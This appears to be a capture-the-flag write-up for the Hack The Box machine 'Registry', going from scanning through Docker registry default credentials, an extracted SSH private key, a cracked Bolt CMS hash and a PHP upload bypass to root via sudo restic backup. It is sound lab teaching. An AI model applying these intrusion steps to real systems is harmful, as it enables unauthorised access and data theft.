# Registry
>Author : Xyan1d3
>Date : 18th July 2021
>IP : 10.10.10.159
>OS : Linux
>Difficulty : Hard
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sun Jul 18 16:19:47 2021 as: nmap -sC -sV -v -oN nmap/registry 10.10.10.159
Nmap scan report for 10.10.10.159
Host is up (0.070s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
|_SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster on `80/tcp`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # gobuster dir -u http://10.10.10.159 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster80.out -t 50 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.159
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/07/18 16:25:11 Starting gobuster in directory enumeration mode
===============================================================
/install              (Status: 301) [Size: 194] [--> http://10.10.10.159/install/]
/bolt                 (Status: 301) [Size: 194] [--> http://10.10.10.159/bolt/]
```

## Web Enumeration
The `https://10.10.10.159` leaks a possible hostname of `docker.registry.htb`.
![[Pasted image 20210718162650.png]]

We have a weird file at `http://10.10.10.159/install/` which is actually an `gzip` data.
![[Pasted image 20210718170256.png]]
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # wget http://10.10.10.159/install
--2021-07-18 17:03:40--  http://10.10.10.159/install
Connecting to 10.10.10.159:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://10.10.10.159/install/ [following]
--2021-07-18 17:03:40--  http://10.10.10.159/install/
Reusing existing connection to 10.10.10.159:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘install’

install                                        [ <=>                                                                                  ]   1.03K  --.-KB/s    in 0s      

2021-07-18 17:03:41 (27.3 MB/s) - ‘install’ saved [1050]

┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # file install
install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200
```

But, We cant `unzip` the file as it is broken.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # gunzip install.gz 

gzip: install.gz: unexpected end of file
```

We have bolt CMS running on `http://10.10.10.159/bolt/`.
![[Pasted image 20210718163841.png]]
The Bolt CMS has  a lot of `Authenticated RCE` but, 1st we need to find credentials.

## Docker Registry Enumeration
We also have docker registry HTTP API at `https://docker.registry.htb/v2/`.
It prompts us for credentials. We try `admin` : `admin` and it works.
![[Pasted image 20210718163943.png]]

It consists of `_catalog` endpoint which lists the available docker images.
![[Pasted image 20210718164219.png]]

We could now try to search for the tags of the docker image.
![[Pasted image 20210718164407.png]]

We now know that the docker registry has an image with name `bolt-image:latest`.
Now, We can attempt to `docker pull` the image onto our box and inspect it.But, It keeps giving us an SSL error.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # docker pull docker.registry.htb/bolt-image
Using default tag: latest
Error response from daemon: Get "https://docker.registry.htb/v2/": x509: certificate relies on legacy Common Name field, use SANs or temporarily enable Common Name matching with GODEBUG=x509ignoreCN=0
```

I am unable to fix this error even importing the `SSL` certificate did not work.
```python
┌─[Magisk@Xyan1d3]─[17.17.17.9]─[~/htb/registry/registry-cli]
└──╼ # python3 registry.py -l admin:admin -r https://docker.registry.htb --no-validate-ssl
---------------------------------
Image: bolt-image
  tag: latest
┌─[Magisk@Xyan1d3]─[17.17.17.9]─[~/htb/registry/registry-cli]
└──╼ # python3 registry.py -l admin:admin -r https://docker.registry.htb --no-validate-ssl --layers
---------------------------------
Image: bolt-image
  tag: latest
    layer: sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff, size: 37206102
    layer: sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797, size: 851
    layer: sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a, size: 547
    layer: sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0, size: 162
    layer: sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791, size: 104569678
    layer: sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7, size: 803
    layer: sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c, size: 222
    layer: sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee, size: 682
    layer: sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b, size: 335
```

We could now use a `docker-fetch.py`.
Link : https://github.com/NotSoSecure/docker_fetch
```python
┌─[X]─[Magisk@Xyan1d3]─[17.17.17.9]─[~/htb/registry/docker-dump]
└──╼ # python2 ../docker_fetch/docker_image_fetch.py -u https://admin:admin@docker.registry.htb
/usr/local/lib/python2.7/dist-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  CryptographyDeprecationWarning,

[+] List of Repositories:

bolt-image

Which repo would you like to download?:  bolt-image



[+] Available Tags:

latest

Which tag would you like to download?:  latest

Give a directory name:  hello
Now sit back and relax. I will download all the blobs for you in hello directory. 
Open the directory, unzip all the files and explore like a Boss. 

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
```

We read the `302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar` and find out that it has a `01-ssh.sh` file
![[Pasted image 20210718191931.png]]
```bash
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

We could now read the `2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791.tar` and find our `SSH` keys from the `/root/.ssh` directory.
![[Pasted image 20210718192517.png]]

We could use the key and the passphrase `GkOcz221Ftb3ugog`.

Bolt Unlocked `SSH` key.
```txt
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

# Initial FootHold as bolt
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry]
└──╼ # ssh -i bolt-unlock.pem bolt@10.10.10.159
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Sun Jul 18 14:07:02 UTC 2021

  System load:  0.0                Users logged in:                0
  Usage of /:   25.4% of 13.53GB   IP address for eth0:            10.10.10.159
  Memory usage: 17%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-1bad9bd75d17: 172.18.0.1
  Processes:    170
Last login: Sun Jul 18 14:05:11 2021 from 10.10.14.22
bolt@bolt:~$ whoami
bolt
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
```

## Getting the user Flag
```python
bolt@bolt:~$ ls -l
total 4
-r-------- 1 bolt bolt 33 Sep 26  2019 user.txt
bolt@bolt:~$ cat user.txt 
ytc0ytdmnzywnzgxngi0zte0otm3ywzi
```

# User Escalation to www-data
We find out that we have a `bolt.db` which is an `sqlite3` database.
```python
bolt@bolt:/var/www/html/bolt/app/database$ ls -l
total 288
-rw-r--r-- 1 www-data www-data 294912 Jul 18 11:05 bolt.db
bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db 
bolt.db: SQLite 3.x database, last written using SQLite version 3022000
```

We transfer the `bolt.db` file into our box using `scp` and start analying the file.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry/bolt]
└──╼ # sqlite3 bolt.db 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|["files://shell.php"]|1||||0||["root","everyone"]
```

We find a `bcrypt` Hash which we can crack.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/registry/bolt]
└──╼ # john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (?)
1g 0:00:00:14 DONE (2021-07-18 19:55) 0.07032g/s 24.05p/s 24.05c/s 24.05C/s strawberry..ihateyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**We find out that the credential of the `bolt CMS` is `strawberry`.**
We could now login to `bolt CMS`.
![[Pasted image 20210718200621.png]]

We try to upload a `shell.php` file into the `bolt CMS` but it blocks us.
![[Pasted image 20210718202639.png]]

We could modify the config file to allow us to upload the `php` file.
![[Pasted image 20210718203348.png]]

We add `php` to the allowed extensions.
![[Pasted image 20210718203840.png]]

But, We upload the php reverse shell but, It does not work as the firewall on the box blocks us.

![[Pasted image 20210718204713.png]]

# Root Escalation
We compile a rest server and upload it into the box and run.
```python
bolt@bolt:/dev/shm$ ./rest-server --no-auth
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
Starting server on :8000
```

We could `restic` init the `REST` server repo.
```python
www-data@bolt:~/html/bolt/files$ restic init -r rest:http://127.0.0.1:8000/
enter password for new repository: 
enter password again: 
created restic repository 76f86a68be at rest:http://127.0.0.1:8000/

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
www-data@bolt:~/html/bolt/files$ sudo restic backup -r rest:http://127.0.0.1:8000/ /root/root.txt
enter password for repository: 
password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root/root.txt]
scanned 0 directories, 1 files in 0:00
[0:00] 100.00%  33B / 33B  1 / 1 items  0 errors  ETA 0:00 
duration: 0:00
snapshot e7e869b4 saved
www-data@bolt:~/html/bolt$ restic -r rest:http://127.0.0.1:8000 snapshots
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
e7e869b4  2021-07-18 15:40:36  bolt                    /root/root.txt
----------------------------------------------------------------------
1 snapshots
www-data@bolt:~/html/bolt$ restic -r rest:http://127.0.0.1:8000 ls e7e869b4
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
snapshot e7e869b4 of [/root/root.txt] at 2021-07-18 15:40:36.689810285 +0000 UTC):
/root.txt
www-data@bolt:~/html/bolt$ restic -r rest:http://127.0.0.1:8000 dump e7e869b4 /root.txt
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
ntrkzgnkotaxyju0ntrinda4yzbkztgw
```

## Getting the root Flag
```python
www-data@bolt:~/html/bolt$ restic -r rest:http://127.0.0.1:8000 dump e7e869b4 /root.txt
enter password for repository: 
password is correct
unable to open cache: Stat: stat /var/www/.cache/restic: permission denied
ntrkzgnkotaxyju0ntrinda4yzbkztgw
```
![[Pasted image 20210718212724.png]]
# Credentials
|Location|Username|Password|
|--|--|--|
|Docker Registry|admin|admin|
|Bolt CMS|admin|strawberry|